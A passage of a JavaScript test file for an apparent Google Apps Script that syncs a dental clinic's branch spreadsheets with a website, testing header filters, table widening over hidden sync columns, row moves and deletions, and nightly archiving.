  put(3, 'S-0123456789ac', { mr: '9738', name: 'Yara Leftover', phone: '03005550008' }, 2);    // Sb Alpha sorted onto Yara's old key
  const e = { cfg: { tab: GUL, branch: 'GUL' }, sheet: sh };
  env.ctx.aajReadTab_(e);
  const rows = env.ctx.aajArchiveRows_(e, 0, TODAY);
  assert.deepEqual(Array.from(rows, (x) => [x.r, x.stale]), [[2, true], [3, false]], 'Zed is left over (cleared, not copied again); Sb Alpha is a row of the day being archived (before: cleared without a copy)');
});

/** the tab's basic filter as [first row, first column, rows, columns], or null */
const filterBox = (sh) => (sh.filter ? [sh.filter.range.r, sh.filter.range.c, sh.filter.range.nr, sh.filter.range.nc] : null);

test('Set up gives every tab a header filter over all used columns, the hidden helper columns too (its sort buttons then move whole rows); a narrower filter is widened keeping its criteria; a filter that covers them is left alone', () => {
  const { env, server } = world({ tabs: TABS, patients: ALL_PATIENTS, install: false, helpers: false });
  const gul = env.tab(GUL), nn = env.tab('North Nazimabad'), dha = env.tab('DHA KHI');
  // Gulshan: a filter made before Set up on the visible columns only, showing Waiting rows; NN: one that already reaches over where the helper
  // columns go (17..20); DHA: one that starts at the second column
  const gulCrit = { visibleValues: ['Waiting'] }, nnCrit = { hiddenValues: ['Cancelled'] };
  gul.getRange(1, 1, 50, 13).createFilter().setColumnFilterCriteria(6, gulCrit);
  const nnFilter = nn.getRange(1, 1, 200, 20).createFilter();
  nnFilter.setColumnFilterCriteria(3, nnCrit);
  dha.getRange(1, 2, 80, 12).createFilter();
  const removed0 = env.stats.filtersRemoved || 0;
  scripted(env);
  env.ctx.aajSetup();
  const helperEnd = (t) => { const sh = env.tab(t); let c = 0; for (let j = 1; j <= sh.used().cols; j++) if (/^(Website|Sync key|Sync base|Sync edited)/.test(sh.text(1, j))) c = j; return c; };
  assert.deepEqual(filterBox(gul), [1, 1, 50, helperEnd(GUL)], 'Gulshan: widened over the same rows to every used column');
  assert.equal(gul.filter.criteria.get(6), gulCrit, 'Gulshan: the Waiting criteria is kept on its column');
  assert.equal(gul.filter.criteria.size, 1);
  assert.equal(nn.filter, nnFilter, 'North Nazimabad: the filter that already covers the helper columns is the same filter');
  assert.deepEqual(filterBox(nn), [1, 1, 200, 20], 'North Nazimabad: not changed');
  assert.equal(nn.filter.criteria.get(3), nnCrit);
  assert.deepEqual(filterBox(dha), [1, 1, 80, helperEnd('DHA KHI')], 'DHA: a filter that starts at the second column now starts at the first');
  for (const t of ['Gulberg Lhr', 'Islamabad']) assert.deepEqual(filterBox(env.tab(t)), [1, 1, env.tab(t).getMaxRows(), helperEnd(t)], t + ': a new filter over every row and used column');
  assert.equal((env.stats.filtersRemoved || 0) - removed0, 2, 'only the two narrow filters were taken off (to be widened)');
  assert.match(logText(env), /Gulshan KHI.*The filter in row 1 now covers the hidden columns too/);
  assert.match(logText(env), /Islamabad.*A filter was added to row 1/);
  assert.ok(!/North Nazimabad.*filter/.test(logText(env)), 'nothing said about the filter that was left alone');
  // a second Set up (repair) changes nothing
  const boxes = TABS.map((t) => filterBox(env.tab(t)));
  const created = env.stats.filtersCreated;
  scripted(env);
  env.ctx.aajSetup();
  assert.deepEqual(TABS.map((t) => filterBox(env.tab(t))), boxes);
  assert.equal(env.stats.filtersCreated, created, 'no filter made again');
  assert.ok(server.calls.length > 0);
});

test('the minute tick puts the header filter back when staff removed it (at most every ten minutes, only when it reads the tabs anyway); a filter Google refuses is logged once a day and the sync goes on', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  assert.deepEqual(filterBox(sh), [1, 1, sh.getMaxRows(), colOf(env, GUL, 'sync edited')], 'the first full read made it');
  sh.filter = null;                                           // staff: Data > Remove filter
  env.touch();
  env.advance(61000);
  env.ticks(2);
  assert.equal(sh.filter, null, 'not looked at again within ten minutes');
  env.advance(10 * 60000);
  env.touch();
  env.ticks(1);
  assert.deepEqual(filterBox(sh), [1, 1, sh.getMaxRows(), colOf(env, GUL, 'sync edited')], 'put back');
  // Google refuses (merged cells in row 1, say): one line in the log that day, and the rows still sync
  sh.filter = null;
  const real = env.Range.prototype.createFilter;
  env.Range.prototype.createFilter = function () { throw new Error('You can\'t create a filter on a range with merged cells.'); };
  try {
    for (let k = 0; k < 3; k++) { env.advance(11 * 60000); env.touch(); env.ticks(1); }
    assert.equal((logText(env).match(/The filter in row 1 could not be set/g) || []).length, 1, 'logged once');
    env.typeRow(GUL, 9, ['9799', 'Filter Walker', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001110099', '']);
    server.addPatient({ mr: '9799', name: 'Filter Walker', phone: '03001110099' });
    settle(env, 3);
    assert.ok(server.state.visits.some((v) => v.mr === '9799'), 'the sync works without the filter');
  } finally { env.Range.prototype.createFilter = real; }
});

// ------------------------------------------------------------------------------------------------ round 12 (2026-10-11): RS12-2 (a website row moved in its first minute), RS12-1 (a busy day), RS12-3 (the tabs are Google Sheets tables)
/** the website adds a second row at the bottom; in the minute before the sheet's next call claims it, a wrong entry above is removed with "Delete cells, shift up" */
function rs12p8(kind) {
  const { env, server } = world({ rows: { [GUL]: [sbVisit(1, 'RCT'), sbVisit(2, 'Filling'), sbVisit(3)] }, patients: SB_PATIENTS });
  settle(env, 3);
  server.addVisit({ branch: 'GUL', date: TODAY, mr: SB_PATIENTS[4].mr, treatment: 'Consultation' });     // Sb Echo, added on the website
  env.ticks(3);
  assert.equal(statusOf(env, GUL, 5), '✓ Added from the website');
  if (kind === 'visit') server.addVisit({ branch: 'GUL', date: TODAY, mr: SB_PATIENTS[0].mr, treatment: 'Consultation' });
  else server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Webwalk Inn', phone: kind === 'checkup with phone' ? '03009990077' : '', checkup_for: 'Checkup' });
  env.ticks(1);                                               // added at the bottom; its key reaches the website only with the next call
  const who = kind === 'visit' ? SB_PATIENTS[0].name : 'Webwalk Inn';
  assert.equal(rowOf(env, GUL, who), 6, kind + ': added at the bottom');
  const records = () => (kind === 'visit' ? server.state.visits.filter((v) => v.mr === SB_PATIENTS[0].mr) : server.state.checkups.filter((c) => c.name === 'Webwalk Inn'));
  assert.equal(records().length, 1);
  shiftUpVisible(env, GUL, 2);                                // Sb Bravo (a wrong entry) removed: every person one row up, the hidden cells stay, row 6 is blank
  env.advance(61000);
  env.ticks(1);
  const firstKey = cellOf(env, GUL, rowOf(env, GUL, who), 'sync key');
  for (let k = 0; k < 5; k++) { env.advance(61000); env.ticks(1); }
  return { env, server, who, records, firstKey };
}

test('RS12-2: a row the website added a minute ago, moved before the next call ("Delete cells, shift up" of a wrong entry above it): one row, one record, one nightly line (visit; checkup with a phone; checkup without a phone)', () => {
  for (const kind of ['visit', 'checkup with phone', 'checkup without phone']) {
    const { env, server, who, records, firstKey } = rs12p8(kind);
    assert.deepEqual(rowsNamed(env, GUL, who).length, 1, `${kind}: one row (before: the website row was added a second time)`);
    assert.equal(records().length, 1, `${kind}: one record on the website (before, without a phone: a second checkup)`);
    assert.equal(firstKey, 'W-' + records()[0].id, kind + ': the minute after the move its row already carries the record\'s key (its key was left on the blank row)');
    const r = rowOf(env, GUL, who);
    assert.ok(statusOf(env, GUL, r).startsWith('✓'), `${kind}: ${statusOf(env, GUL, r)}`);
    assert.equal(cellOf(env, GUL, r, 'sync key'), records()[0].sheet_key || 'W-' + records()[0].id, kind + ': the row carries the record\'s own key');
    for (const name of ['Sb Charlie', 'Sb Delta', 'Sb Echo']) assert.equal(rowsNamed(env, GUL, name).length, 1, `${kind}: ${name} once`);
    assert.equal(server.state.visits.filter((v) => v.mr === SB_PATIENTS[4].mr).length, 1, kind + ': Sb Echo once');
    quiet(env, server);
    const lines = kind === 'visit' ? (env.at(TODAY, '23:58'), env.ticks(1), env.at(NEXT, '00:05'), env.ticks(2), ckSheet(env) ? ckSheet(env).values().slice(1).map((x) => x[1]) : []) : nightLines(env);
    assert.equal(lines.filter((n) => n === 'Webwalk Inn').length, kind === 'visit' ? 0 : 1, `${kind}: one nightly line for one walk-in (before: two)`);
    assert.equal(archiveSheet(env).values().slice(1).filter((x) => x.includes(who)).length, 1, kind + ': one archive line');
  }
});

test('RS12-2 (guard): a website row moved in its first minute and edited in that minute (so no row shows exactly its cells) is not added again while its row settles; that row adopts it', () => {
  for (const kind of ['visit', 'checkup with phone', 'checkup without phone']) {
    const { env, server } = world({ rows: { [GUL]: [sbVisit(1, 'RCT'), sbVisit(2, 'Filling'), sbVisit(3)] }, patients: SB_PATIENTS });
    settle(env, 3);
    if (kind === 'visit') server.addVisit({ branch: 'GUL', date: TODAY, mr: SB_PATIENTS[0].mr, treatment: 'Consultation' });
    else server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Webwalk Inn', phone: kind === 'checkup with phone' ? '03009990077' : '', checkup_for: 'Checkup' });
    env.ticks(1);
    const who = kind === 'visit' ? SB_PATIENTS[0].name : 'Webwalk Inn';
    assert.equal(rowOf(env, GUL, who), 5);
    // Sb Bravo removed with "Delete cells, shift up" (the rows that move onto older keys go to the website at once, so its list comes back this
    // minute), and the new person goes in to the doctor in the same minute: her row is busy and shows another Status than the website sent
    shiftUpVisible(env, GUL, 2);
    setCell(env, GUL, 4, 'waiting', 'Treatment');
    env.ticks(1);                                             // the next minute: her row is still busy (typed less than 60 s ago)
    assert.equal(rowsNamed(env, GUL, who).length, 1, kind + ': not added again while her row settles');
    for (let k = 0; k < 5; k++) { env.advance(61000); env.ticks(1); }
    assert.equal(rowsNamed(env, GUL, who).length, 1, kind + ': one row');
    const recs = kind === 'visit' ? server.state.visits.filter((v) => v.mr === SB_PATIENTS[0].mr) : server.state.checkups.filter((c) => c.name === 'Webwalk Inn');
    assert.equal(recs.length, 1, kind + ': one record');
    assert.equal(kind === 'visit' ? recs[0].status : recs[0].day_status, 'in_treatment', kind + ': the Status typed after the move reached the one record');
    for (const name of ['Sb Charlie', 'Sb Delta']) assert.equal(rowsNamed(env, GUL, name).length, 1, `${kind}: ${name} once`);
    assert.equal(server.state.visits.length, kind === 'visit' ? 3 : 2, kind + ': only the wrong entry\'s visit is gone');
  }
});

test('RS12-2: a row released in the same minute at the bottom of the list (its cells cleared) is reused by a row the website adds: no blank gap', () => {
  const { env, server } = world({ rows: { [GUL]: [sbVisit(1, 'RCT'), sbVisit(2, 'Filling'), sbVisit(3)] }, patients: SB_PATIENTS });
  settle(env, 3);
  env.clearRow(GUL, 4, 1, colOf(env, GUL, 'website') - 1);   // Sb Delta's cells cleared (a wrong entry): its hidden key stays a moment
  server.addVisit({ branch: 'GUL', date: TODAY, mr: SB_PATIENTS[0].mr, treatment: 'Consultation' });
  env.ticks(1);
  assert.equal(rowOf(env, GUL, SB_PATIENTS[0].name), 4, 'the website row goes into the row that was just released (before: row 5, below a blank row)');
  assert.equal(cellOf(env, GUL, 4, 'sync key'), 'W-' + server.state.visits.find((v) => v.mr === SB_PATIENTS[0].mr).id);
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.visits.filter((v) => v.mr === SB_PATIENTS[3].mr).length, 0, 'the cleared wrong entry is removed like a deleted row');
  assert.equal(server.state.visits.filter((v) => v.mr === SB_PATIENTS[0].mr).length, 1);
  assert.equal(rowsNamed(env, GUL, SB_PATIENTS[0].name).length, 1);
});

/** the tab's table as [first row, first column, rows, columns] */
const tableBox = (t) => [t.range.r, t.range.c, t.range.nr, t.range.nc];

test('RS12-3: the Apps Script manifest turns on the Advanced Sheets service as "Sheets" (v4), which reads and widens the tables', () => {
  const m = JSON.parse(fs.readFileSync(new URL('../apps-script/appsscript.json', import.meta.url), 'utf8'));
  assert.deepEqual(m.dependencies.enabledAdvancedServices.find((x) => x.serviceId === 'sheets'), { userSymbol: 'Sheets', version: 'v4', serviceId: 'sheets' });
  assert.equal(m.runtimeVersion, 'V8');
  assert.ok(!('oauthScopes' in m), 'no fixed scopes (they would have to list every service the script uses)');
});

test('RS12-3: Set up widens each branch tab\'s table over the hidden helper columns (its rows, footer, column names and types stay; the helpers stay hidden); no filter is tried over a table; a second Set up and the minute checks change nothing; a narrowed table is widened again', () => {
  const { env } = world({ tabs: TABS, patients: ALL_PATIENTS, install: false, helpers: false });
  const tables = {}, before = {};
  for (const t of TABS) {
    tables[t] = env.addTable(t, { nr: env.tab(t).used().rows + 10, footer: t === GUL, types: t === GUL ? { 4: 'NUMBER', 5: 'DROPDOWN' } : {} });
    before[t] = clone(tables[t]);
  }
  scripted(env);
  env.ctx.aajSetup();
  for (const t of TABS) {
    const sh = env.tab(t), tb = tables[t], n = before[t].columns.length;
    assert.deepEqual(tableBox(tb), [1, 1, before[t].range.nr, colOf(env, t, 'sync edited')], t + ': the table reaches over the four helper columns; its rows stay');
    assert.deepEqual(tb.columns.slice(0, n), before[t].columns, t + ': its own columns keep their names and types');
    assert.deepEqual(tb.columns.slice(n).map((c) => c.columnName), ['Website', 'Sync key', 'Sync base', 'Sync edited'], t + ': the new columns are the helper columns');
    assert.equal(tb.footer, before[t].footer, t + ': the footer row stays');
    for (const h of ['sync key', 'sync base', 'sync edited']) assert.ok(sh.isColumnHiddenByUser(colOf(env, t, h)), t + ': ' + h + ' hidden');
    assert.ok(!sh.isColumnHiddenByUser(colOf(env, t, 'website')), t + ': the Website column shows');
    assert.equal(sh.filter || null, null, t + ': no basic filter');
  }
  assert.equal(env.stats.filterOverTable || 0, 0, 'no filter was tried over a table (Google refuses one)');
  assert.equal(env.stats.tablesUpdated, 5);
  assert.match(logText(env), /Gulshan KHI.*The table now reaches over the hidden columns, so its sort moves whole rows/);
  assert.ok(!/Sorting:/.test(env.dialogs[env.dialogs.length - 1].text), 'the last box has nothing to say about sorting');
  scripted(env);
  env.ctx.aajSetup();
  for (let k = 0; k < 12; k++) { env.advance(61000); env.touch(); env.ticks(1); }
  assert.equal(env.stats.tablesUpdated, 5, 'a second Set up and the minute checks widen nothing again');
  assert.ok(env.sheetsCalls.filter((c) => c.kind === 'get').length >= 3, 'the minute check looks at the tables (every ten minutes)');
  // somebody drags the table's edge back over the visible columns only: within ten minutes it reaches over the helper columns again
  tables[GUL].range.nc = 13;
  for (let k = 0; k < 11; k++) { env.advance(61000); env.touch(); env.ticks(1); }
  assert.deepEqual(tableBox(tables[GUL]), [1, 1, before[GUL].range.nr, colOf(env, GUL, 'sync edited')]);
});

// the real Gulshan tab: a table A1:M30 with a footer, the helper columns right of it; visits, two walk-ins called Sana with no phone, a checkup with a phone
const tbRows = () => [sbVisit(0), ['', 'Sana Walkin', '', 'Checkup', '', 'Completed', '', 'Dr Haniya', 'first sana', '', '', '', ''], sbVisit(1, 'RCT'),
  ['', 'Ck Phone', '', 'Checkup', '', 'Waiting', '', '', 'pain lower right', '', '', '03009990011', ''], sbVisit(2, 'Filling'),
  ['', 'Sana Walkin', '', 'Checkup', '', 'Treatment', '', '', 'second sana', '', '', '', ''], sbVisit(3)];
function tableWorld(widen) {
  const { env, server } = world({ rows: { [GUL]: tbRows() }, patients: SB_PATIENTS });
  const t = env.addTable(GUL, { nr: 30, nc: 13, footer: true });
  if (!widen) env.sheetsErrors.update = 'Invalid requests[0].updateTable: the table could not be changed.';
  settle(env, 3);
  return { env, server, sh: env.tab(GUL), t };
}

test('RS12-3: sorts with the table\'s own menu and a table row deleted: with the table widened they move whole rows (nothing is sent); not widened (the API refused) the hidden keys stay behind and every row still finds its own visit or checkup', () => {
  for (const widen of [true, false]) {
    const tag = widen ? 'widened' : 'not widened';
    const { env, server, t } = tableWorld(widen);
    assert.equal(t.range.nc, widen ? colOf(env, GUL, 'sync edited') : 13, tag + ': setup');
    if (!widen) {
      assert.equal((logText(env).match(/The table could not be made to reach over the hidden columns/g) || []).length, 1, 'said once in the log');
      assert.match(logText(env), /drag the right edge of the table over the hidden columns/);
    }
    assert.equal(env.stats.filterOverTable || 0, 0, tag + ': no filter tried over the table');
    assert.equal(server.state.checkups.length, 3, tag);
    assert.equal(server.state.visits.length, 4, tag);
    const ids = () => JSON.stringify([server.state.visits.map((v) => [v.id, v.mr, v.details, v.status]).sort(), server.state.checkups.map((c) => [c.id, c.name, c.details, c.day_status]).sort()]);
    const first = ids();
    for (const [label, dir] of [['patient', 1], ['mr', -1], ['treatment', 1], ['waiting', -1], ['patient', -1]]) {
      const from = server.calls.length;
      env.sortTable(GUL, colOf(env, GUL, label), dir);
      env.advance(61000);
      env.ticks(3);
      if (widen) assert.equal(sentRowsSince(server, from).length, 0, `${tag}, sort by ${label}: whole rows moved, nothing to send`);
      assert.equal(ids(), first, `${tag}, sort by ${label}: the same visits and checkups, each with its own details and status`);
      assert.equal(server.state.removedLog.length, 0, `${tag}, sort by ${label}: nothing removed`);
      assert.equal(rowsNamed(env, GUL, 'Sana Walkin').length, 2, `${tag}, sort by ${label}: two Sana rows`);
      ckRowsMatch(env, server, 'Sana Walkin');
      ckRowsMatch(env, server, 'Ck Phone');
      for (const p of SB_PATIENTS.slice(0, 4)) {
        const r = rowOf(env, GUL, p.name);
        assert.equal(cellOf(env, GUL, r, 'sync key'), webVisit(server, p.name).sheet_key, `${tag}, sort by ${label}: ${p.name} carries its own visit's key`);
        assert.ok(statusOf(env, GUL, r).startsWith('✓'), `${tag}, sort by ${label}: ${p.name}: ${statusOf(env, GUL, r)}`);
      }
    }
    // a wrong entry deleted from the table's menu: only the table's columns move up (the helper columns too when they are in it)
    env.deleteTableRow(GUL, rowOf(env, GUL, 'Sb Delta'));
    env.advance(61000);
    env.ticks(4);
    assert.equal(server.state.visits.filter((v) => v.mr === SB_PATIENTS[3].mr).length, 0, tag + ': the deleted wrong entry is removed from the website');
    assert.equal(server.state.visits.length, 3, tag + ': the other visits stay');
    assert.equal(server.state.checkups.length, 3, tag + ': the checkups stay');
    ckRowsMatch(env, server, 'Sana Walkin');
    for (const p of SB_PATIENTS.slice(0, 3)) assert.equal(cellOf(env, GUL, rowOf(env, GUL, p.name), 'sync key'), webVisit(server, p.name).sheet_key, `${tag}: ${p.name} after the delete`);
    quiet(env, server);
    assert.equal(nightLines(env).filter((n) => n === 'Sana Walkin').length, 2, tag + ': two nightly lines for the two Sanas');
  }
});

test('RS12-3: a helper column made again (staff deleted it) lands right of the table: the table reaches over it in the same minute, not ten minutes later; nothing is doubled or removed', () => {
  const { env, server, t } = tableWorld(true);
  const sh = env.tab(GUL), c = colOf(env, GUL, 'sync base');
  for (let r = 1; r <= sh.used().rows; r++) sh._set(r, c, null);         // the Sync base column emptied, header too (as good as deleted)
  env.touch();
  env.advance(61000);
  env.ticks(1);
  const nb = colOf(env, GUL, 'sync base');
  assert.ok(nb > c, 'made again, right of the other helper columns');
  assert.equal(t.range.nc, nb, 'the table reaches over it at once');
  assert.ok(sh.isColumnHiddenByUser(nb), 'and it is hidden');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.visits.length, 4);
  assert.equal(server.state.checkups.length, 3);
  assert.equal(server.state.removedLog.length, 0);
  ckRowsMatch(env, server, 'Sana Walkin');
});

test('RS12-3 with RS12-2: a row the website added a minute ago, then a table row deleted above it: one row and one record, widened or not', () => {
  for (const widen of [true, false]) {
    for (const kind of ['visit', 'checkup without phone']) {
      const tag = (widen ? 'widened' : 'not widened') + ', ' + kind;
      const { env, server } = tableWorld(widen);
      server.addVisit({ branch: 'GUL', date: TODAY, mr: SB_PATIENTS[4].mr, treatment: 'Consultation' });     // Sb Echo, added and claimed
      env.ticks(3);
      if (kind === 'visit') server.addVisit({ branch: 'GUL', date: TODAY, mr: SB_PATIENTS[5].mr, treatment: 'Consultation' });
      else server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Webwalk Inn', phone: '', checkup_for: 'Checkup' });
      env.ticks(1);
      const who = kind === 'visit' ? SB_PATIENTS[5].name : 'Webwalk Inn';
      assert.equal(rowOf(env, GUL, who), 10, tag + ': added below the list, inside the table');
      env.deleteTableRow(GUL, 2);                             // Sb Alpha removed (a wrong entry) from the table's menu
      for (let k = 0; k < 6; k++) { env.advance(61000); env.ticks(1); }
      assert.equal(rowsNamed(env, GUL, who).length, 1, tag + ': one row');
      assert.equal(rowsNamed(env, GUL, SB_PATIENTS[4].name).length, 1, tag + ': Sb Echo once');
      const recs = kind === 'visit' ? server.state.visits.filter((v) => v.mr === SB_PATIENTS[5].mr) : server.state.checkups.filter((c) => c.name === 'Webwalk Inn');
      assert.equal(recs.length, 1, tag + ': one record');
      assert.equal(server.state.visits.filter((v) => v.mr === SB_PATIENTS[0].mr).length, 0, tag + ': the wrong entry is removed');
      assert.equal(server.state.checkups.filter((c) => c.name === 'Sana Walkin').length, 2, tag + ': the Sanas keep their checkups');
    }
  }
});

test('RS12-3: the Advanced Sheets service not turned on: nothing is changed on the tabs (no filter is tried, the tab may be a table), the last box of Set up and the log say what to do by hand, and the sync works', () => {
  const { env, server } = world({ tabs: [GUL], patients: [...BASE_PATIENTS, ...SB_PATIENTS], install: false, helpers: false, envOptions: { sheetsService: false } });
  const t = env.addTable(GUL, { nr: 30, nc: 13 });
  scripted(env);
  env.ctx.aajSetup();
  const done = env.dialogs[env.dialogs.length - 1].text;
  assert.match(done, /^Done\./);
  assert.match(done, /Sorting: Could not check whether this tab is a table \(the Google Sheets API service is not turned on in the script\)/);
  assert.match(done, /add the Google Sheets API in the script editor \(Services, \+\) and run Set up again/);
  assert.deepEqual(tableBox(t), [1, 1, 30, 13], 'the table is not changed');
  assert.equal(env.tab(GUL).filter || null, null, 'no filter');
  assert.equal(env.stats.filterOverTable || 0, 0, 'no filter was tried');
  for (let k = 0; k < 25; k++) { env.advance(61000); env.touch(); env.ticks(1); }
  assert.equal((logText(env).match(/Could not check whether this tab is a table/g) || []).length, 1, 'once a day in the log (Set up\'s line), not every ten minutes');
  env.typeRow(GUL, 9, sbVisit(5));
  settle(env, 3);
  assert.ok(server.state.visits.some((v) => v.mr === SB_PATIENTS[5].mr), 'the sync works');
});

console.log(`${passed} passed, ${failed} failed`);
